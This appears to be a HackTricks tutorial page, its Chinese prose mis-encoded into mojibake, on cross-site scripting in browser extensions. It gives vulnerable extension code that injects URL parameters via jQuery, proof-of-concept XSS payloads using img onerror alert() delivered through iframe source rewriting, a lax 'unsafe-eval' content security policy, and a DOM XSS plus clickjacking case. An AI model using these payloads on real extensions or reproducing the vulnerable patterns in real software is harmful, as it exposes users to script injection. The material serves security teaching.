# BrowExt - XSS ç¤ºä¾‹

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## é€šè¿‡Iframeè¿›è¡Œè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰

åœ¨è¿™ä¸ªè®¾ç½®ä¸­ï¼Œå®ç°äº†ä¸€ä¸ª**å†…å®¹è„šæœ¬**æ¥å®ä¾‹åŒ–ä¸€ä¸ªIframeï¼Œå°†å¸¦æœ‰æŸ¥è¯¢å‚æ•°çš„URLä½œä¸ºIframeçš„æ¥æºï¼š
```javascript
chrome.storage.local.get("message", result => {
let constructedURL = chrome.runtime.getURL("message.html") +
"?content=" + encodeURIComponent(result.message) +
"&redirect=https://example.net/details";
frame.src = constructedURL;
});
```
ä¸€ä¸ªå…¬å¼€è®¿é—®çš„HTMLé¡µé¢ï¼Œ**`message.html`**ï¼Œæ—¨åœ¨æ ¹æ®URLä¸­çš„å‚æ•°åŠ¨æ€å‘æ–‡æ¡£ä¸»ä½“æ·»åŠ å†…å®¹ï¼š
```javascript
$(document).ready(() => {
let urlParams = new URLSearchParams(window.location.search);
let userContent = urlParams.get("content");
$(document.body).html(`${userContent} <button id='detailBtn'>Details</button>`);
$('#detailBtn').on('click', () => {
let destinationURL = urlParams.get("redirect");
chrome.tabs.create({ url: destinationURL });
});
});
```
æ¶æ„è„šæœ¬åœ¨å¯¹æ‰‹é¡µé¢ä¸Šæ‰§è¡Œï¼Œä¿®æ”¹äº†Iframeæºçš„`content`å‚æ•°ï¼Œå¼•å…¥äº†ä¸€ä¸ª**XSS payload**ã€‚è¿™æ˜¯é€šè¿‡æ›´æ–°Iframeçš„æºä»¥åŒ…å«æœ‰å®³è„šæœ¬æ¥å®ç°çš„ï¼š
```javascript
setTimeout(() => {
let targetFrame = document.querySelector("iframe").src;
let baseURL = targetFrame.split('?')[0];
let xssPayload = "<img src='invalid' onerror='alert(\"XSS\")'>";
let maliciousURL = `${baseURL}?content=${encodeURIComponent(xssPayload)}`;

document.querySelector("iframe").src = maliciousURL;
}, 1000);
```
ä¸€ä¸ªè¿‡äºå®½æ¾çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œæ¯”å¦‚ï¼š
```json
"content_security_policy": "script-src 'self' 'unsafe-eval'; object-src 'self';"
```
å…è®¸æ‰§è¡ŒJavaScriptï¼Œä½¿ç³»ç»Ÿå®¹æ˜“å—åˆ°XSSæ”»å‡»ã€‚

è§¦å‘XSSçš„å¦ä¸€ç§æ–¹æ³•æ˜¯åˆ›å»ºä¸€ä¸ªIframeå…ƒç´ ï¼Œå¹¶å°†å…¶æºè®¾ç½®ä¸ºåŒ…å«æœ‰å®³è„šæœ¬ä½œä¸º`content`å‚æ•°ï¼š
```javascript
let newFrame = document.createElement("iframe");
newFrame.src = "chrome-extension://abcdefghijklmnopabcdefghijklmnop/message.html?content=" +
encodeURIComponent("<img src='x' onerror='alert(\"XSS\")'>");
document.body.append(newFrame);
```
## DOM-based XSS + ClickJacking

è¿™ä¸ªä¾‹å­å–è‡ª[åŸå§‹å¸–å­](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)ã€‚

æ ¸å¿ƒé—®é¢˜æºäºä½äº**`/html/bookmarks.html`**ä¸­çš„DOM-basedè·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´ã€‚æœ‰é—®é¢˜çš„JavaScriptä»£ç æ˜¯**`bookmarks.js`**ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œå…·ä½“å¦‚ä¸‹ï¼š
```javascript
$('#btAdd').on('click', function() {
var bookmarkName = $('#txtName').val();
if ($('.custom-button .label').filter(function() {
return $(this).text() === bookmarkName;
}).length) return false;

var bookmarkItem = $('<div class="custom-button">');
bookmarkItem.html('<span class="label">' + bookmarkName + '</span>');
bookmarkItem.append('<button class="remove-btn" title="delete">x</button>');
bookmarkItem.attr('data-title', bookmarkName);
bookmarkItem.data('timestamp', (new Date().getTime()));
$('section.bookmark-container .existing-items').append(bookmarkItem);
persistData();
});
```
è¿™æ®µä»£ç ä»**`txtName`**è¾“å…¥æ¡†ä¸­è·å–**value**ï¼Œç„¶åä½¿ç”¨**å­—ç¬¦ä¸²æ‹¼æ¥ç”ŸæˆHTML**ï¼Œæœ€åé€šè¿‡jQueryçš„`.append()`å‡½æ•°å°†å…¶é™„åŠ åˆ°DOMä¸­ã€‚

é€šå¸¸æƒ…å†µä¸‹ï¼ŒChromeæ‰©å±•çš„å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆCSPï¼‰ä¼šé˜²æ­¢æ­¤ç±»æ¼æ´ã€‚ç„¶è€Œï¼Œç”±äº**é€šè¿‡â€˜unsafe-evalâ€™æ”¾å®½CSP**ä»¥åŠä½¿ç”¨jQueryçš„DOMæ“ä½œæ–¹æ³•ï¼ˆå…¶ä¸­ä½¿ç”¨[`globalEval()`](https://api.jquery.com/jquery.globaleval/)å°†è„šæœ¬ä¼ é€’ç»™[`eval()`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)ä»¥åœ¨DOMæ’å…¥æ—¶æ‰§è¡Œï¼‰ï¼Œä»ç„¶å­˜åœ¨åˆ©ç”¨å¯èƒ½ã€‚

å°½ç®¡è¿™ä¸ªæ¼æ´å¾ˆé‡è¦ï¼Œä½†å…¶åˆ©ç”¨é€šå¸¸å–å†³äºç”¨æˆ·äº¤äº’ï¼šè®¿é—®é¡µé¢ã€è¾“å…¥XSSæœ‰æ•ˆè´Ÿè½½å¹¶æ¿€æ´»â€œAddâ€æŒ‰é’®ã€‚

ä¸ºäº†å¢å¼ºè¿™ä¸ªæ¼æ´ï¼Œè¿˜åˆ©ç”¨äº†ä¸€ä¸ªæ¬¡è¦çš„**ç‚¹å‡»åŠ«æŒ**æ¼æ´ã€‚Chromeæ‰©å±•çš„æ¸…å•å±•ç¤ºäº†ä¸€ä¸ªå¹¿æ³›çš„`web_accessible_resources`ç­–ç•¥ï¼š
```json
"web_accessible_resources": [
"html/bookmarks.html",
"dist/*",
"assets/*",
"font/*",
[...]
],
```
å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œ**`/html/bookmarks.html`** é¡µé¢å®¹æ˜“å—åˆ°æ¡†æ¶åŒ–çš„å½±å“ï¼Œå› æ­¤å®¹æ˜“å—åˆ°**ç‚¹å‡»åŠ«æŒ**çš„æ”»å‡»ã€‚æ”»å‡»è€…åˆ©ç”¨è¿™ç§æ¼æ´å°†é¡µé¢åµŒå…¥åˆ°æ”»å‡»è€…çš„ç«™ç‚¹ä¸­ï¼Œå¹¶ç”¨DOMå…ƒç´ è¦†ç›–å®ƒï¼Œä»¥æ¬ºéª—æ€§åœ°é‡æ–°è®¾è®¡ç•Œé¢ã€‚è¿™ç§æ“çºµä¼šå¯¼è‡´å—å®³è€…æ— æ„ä¸­ä¸åº•å±‚æ‰©å±•è¿›è¡Œäº¤äº’ã€‚

## å‚è€ƒèµ„æ–™

* [https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/](https://palant.info/2022/08/31/when-extension-pages-are-web-accessible/)
* [https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/](https://thehackerblog.com/steam-fire-and-paste-a-story-of-uxss-via-dom-xss-clickjacking-in-steam-inventory-helper/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
